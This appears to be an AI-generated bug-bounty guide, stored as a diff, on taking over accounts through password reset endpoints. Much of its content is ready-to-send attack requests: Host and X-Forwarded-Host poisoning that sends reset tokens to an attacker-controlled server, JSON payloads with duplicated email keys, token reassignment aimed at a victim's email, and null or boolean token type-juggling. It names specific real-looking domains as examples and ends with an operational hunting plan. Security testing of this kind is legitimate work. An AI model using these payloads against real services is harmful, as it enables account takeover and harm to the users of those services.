@@ -1,0 +1,86 @@
+Password reset endpoints are one of the most high-value surfaces for Account Takeover (ATO), but 99% of researchers and automated scripts only look for basic rate-limiting holes or token brute-forcing. They fail because they treat the login recovery process as a single, isolated form.
+In reality, a password reset endpoint is a complex intersection of three distinct backend tiers: the Routing Layer (WAF/Proxy), the Business Logic State Machine, and the Data Layer (Database parsing). [1] 
+Below are the elite architectural assumptions hidden from standard views—and exactly how to break them.
+------------------------------
+## 🛡️ Tier 1: The Routing & Proxy Layer (The Host Omission)## The Assumption:
+"We generate the reset link safely on the server using our default domain settings. The domain in the email link will always point to our platform." [2, 3] 
+## The Reality:
+Many developers generate the password reset link dynamically by reading the incoming HTTP Host header from the user's request to ensure it works across multiple regional mirrors (like 1win.com, 1w.run, or 1w.cash). They assume the proxy/WAF validates this header. [4] 
+## How to Break It (Host Header Injection / Poisoning):
+
+   1. Request a password reset for the victim's email address.
+   2. Intercept the request in your proxy and modify the headers to include a malicious host value:
+   
+   POST /api/v1/auth/forgot-password HTTP/1.1
+   Host: 1win.com
+   X-Forwarded-Host: attacker-controlled-server.com
+   
+   3. The Logic Collapse: The API gateway trustfully reads the X-Forwarded-Host parameter to construct the email link. The victim receives a genuine system email, but when they click the reset button, the secret cryptographic token is transmitted directly to your external logging server. [5, 6, 7, 8, 9] 
+
+------------------------------
+## 📊 Tier 2: The Logic State Machine (Asymmetric Step Validation)## The Assumption:
+"The token acts as a master key. If a user supplies a valid token to the final reset endpoint, it naturally implies they are the legitimate owner of the email attached to that token." [10] 
+## The Reality:
+Developers split the recovery workflow into two distinct API routes: [11] 
+
+* Route 1 (/request-reset): Validates the email and drops a token into the database.
+* Route 2 (/confirm-reset): Takes the token and overwrites the password. [12, 13] 
+
+Because they treat Route 2 as a trusted interior environment, they frequently map parameters independently without verifying cross-ownership at the final step. [14] 
+## How to Break It (Parameter Pollution & Multi-Account Cross-Over):
+
+* The Duplicate Email Exploit: Trigger a password reset request but pollute the JSON parameters to pass two independent entities at once:
+
+{
+  "email": "victim@example.com",
+  "email": "attacker@example.com"
+}
+
+If the backend validation checks the first email but the background mailer loop parses the second parameter, the victim's account token lands straight in your attacker inbox. [5, 15] 
+* The Decoupled Token Reassignment: Generate a valid token using your own account. Intercept the final password execution packet (POST /api/v1/auth/reset-password) and supply your valid token alongside the victim's user ID or email:
+
+{
+  "token": "ATTACKER_VALID_TOKEN",
+  "email": "victim@example.com",
+  "new_password": "HackedPassword123!"
+}
+
+The Logic Collapse: If the backend database code checks that ATTACKER_VALID_TOKEN exists and is active, it passes the verification step. It then jumps straight to the update query: UPDATE users SET password = 'HackedPassword123!' WHERE email = :email. Because the email variable was read directly from the user-controlled input rather than the token's database record, the victim's password is overwritten. [15, 16, 17, 18, 19] 
+
+------------------------------
+## 🧬 Tier 3: The Data Layer (Type Confusion & Null State Parsing)## The Assumption:
+"If a cryptographic comparison check fails or receives empty/malformed data, the execution string will naturally throw an exception or evaluate as false, terminating the session." [20] 
+## The Reality:
+When backend microservices process input arrays or typecast parameters loosely, sending non-string values can cause the validation function to skip entirely or return an unintended True / Null state match. [16] 
+## How to Break It (The Empty Token Collision):
+Standard scanners always try to guess alternative tokens (token=123, token=abc). To bypass what they see, remove the token validation value completely or change its variable data type: [16, 21, 22] 
+
+* Payload A (JSON Null Manipulation):
+
+{
+  "token": null,
+  "email": "victim@example.com",
+  "password": "NewPassword123!"
+}
+
+* Payload B (Boolean Type Juggling):
+
+{
+  "token": true,
+  "email": "victim@example.com",
+  "password": "NewPassword123!"
+}
+
+[23, 24, 25] 
+
+## The Logic Collapse:
+If the database table maps unassigned token slots as NULL for standard accounts, executing a loose type comparison (like IF input.token == database.token) can cause a catastrophic data alignment. The expression evaluates NULL == NULL as True, immediately processing the password override request against the target account without requiring a generated link. [16] 
+------------------------------
+## 🚀 Operational Hunting Blueprint
+To find these hidden flaws before anyone else on your target terminal layout:
+
+   1. Map All Multi-Tenant States: Always create two test accounts (Account A and Account B). Never test endpoints using a single identity. [26, 27] 
+   2. Isolate Multi-Step Requests: Intercept the HTTP traffic step-by-step. Take variables generated during Account A's recovery flow and systematically inject them into Account B's active execution threads to look for broken authorization checks.
+   3. Audit the Post-Reset Session State: Look closely at what happens immediately after a password reset finishes. Does the backend automatically drop a valid authorization JWT token into the HTTP response body? If yes, look to see if that response body accidentally leaks secondary information, like the user’s unredacted account profiles or internal tracking IDs. [16, 28] 
+
+Would you like to write a custom target mock request sequence to safely simulate these decoupled validation steps on your workstation, or do you want to explore the flaws hidden inside Two-Factor Authentication (2FA) reset bypasses? [29, 30] 
